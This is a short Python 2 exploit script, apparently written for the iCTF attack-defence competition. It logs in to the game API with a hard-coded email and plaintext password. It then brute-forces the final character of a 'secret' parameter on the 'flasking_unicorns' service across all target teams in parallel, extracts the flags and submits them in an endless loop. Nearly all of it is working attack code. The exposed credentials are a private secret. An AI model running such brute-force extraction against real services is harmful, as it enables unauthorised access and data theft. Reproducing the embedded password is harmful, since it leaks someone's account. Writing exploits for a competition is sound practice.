import time, requests, string
from ictf import iCTF
from multiprocessing import Pool

i = iCTF()
enable = False
team = i.login('nmg355@nyu.edu', 'HZBrKynG4XAMvWPa')

def exploit(t):
    for char in string.ascii_letters + string.digits + '_':
        try:
            r = requests.get('http://{}:{}/see_unicorn'.format(t['hostname'], t['port']), params={'id': t['flag_id'], 'secret': 'a'*31 + char}, allow_redirects=False, timeout=2.0)
            if r.status_code == 200:
                flag = r.text.split('Ah, ')[1].split(' ')[0]
                print flag
                return flag
        except:
            continue
p = Pool(32)

while True:
	flags = []
	targets = team.get_targets(service='flasking_unicorns')['targets']
	flags = p.map(exploit, targets)
	flags = filter(None, flags)

	print flags
	while True:
		try:
			print team.submit_flag(flags)
			break
		except Exception as e:
			print 'got',e,'retrying in 1s'
			time.sleep(1)
	time.sleep(team.get_tick_info()['approximate_seconds_left'] + 30)
